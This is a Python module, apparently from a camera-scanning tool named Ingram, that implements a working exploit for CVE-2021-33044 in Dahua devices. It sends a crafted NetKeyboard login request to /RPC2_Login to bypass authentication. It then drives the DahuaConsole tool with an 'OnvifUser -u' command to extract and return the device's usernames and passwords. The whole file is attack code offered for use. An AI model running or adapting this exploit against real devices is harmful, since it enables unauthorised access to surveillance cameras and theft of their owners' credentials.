"""dahua bypassing authentication vulnerability
some functions need the 'DahuaConsole', reference:
https://github.com/mcw0/DahuaConsole
"""
import os
import requests

from Ingram.utils import config
from Ingram.utils import logger
from Ingram.utils import run_cmd


def dh_console(ip, port, proto='dhip'):
    CWD = os.path.dirname(os.path.abspath(__file__))
    console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
    user, passwd = '', ''
    try:
        cmd = f"""(
            echo "OnvifUser -u"
            echo "quit all"
        ) | python -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto} 2>/dev/null
        """
        code, msg = run_cmd(cmd)
        if code == 0:
            items = msg.split('\n')
            logger.debug(items)
            for idx, val in enumerate(items):
                if 'Name' in val:
                    user = val.split(':')[-1].strip().strip(',').replace('"', '') 
                    passwd = items[idx + 1].split(':')[-1].strip().strip(',').replace('"', '')
                    break
    except Exception as e:
        logger.error(e)
    return user, passwd


def cve_2021_33044(ip: str) -> list:
    headers = {
        'User-Agent': config.USERAGENT,
        'Host': ip,
        'Origin': 'http://' + ip,
        'Referer': 'http://' + ip,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest',
    }
    _json = {
        "method": "global.login",
        "params": {
            "userName": "admin",
            "password": "Not Used",
            "clientType": "NetKeyboard",
            "loginType": "Direct",
            "authorityType": "Default",
            "passwordType": "Default",
        },
        "id": 1,
        "session": 0,
    }
    url = f"http://{ip}/RPC2_Login"

    try:
        r = requests.post(url, headers=headers, json=_json, verify=False, timeout=config.TIMEOUT)
        if r.status_code == 200 and r.json()['result'] == True:
            if ':' in ip: ip, port = ip.split(':')
            else: port = 80

            # firstly, try the dhip
            user, passwd = dh_console(ip, port, proto='dhip')

            # if not successed, try the http
            if not user and not passwd:
                user, passwd = dh_console(ip, port, proto='http')

            return [True, user, passwd, 'cve-2021-33044']
    except Exception as e:
        logger.error(e)
    return [False, ]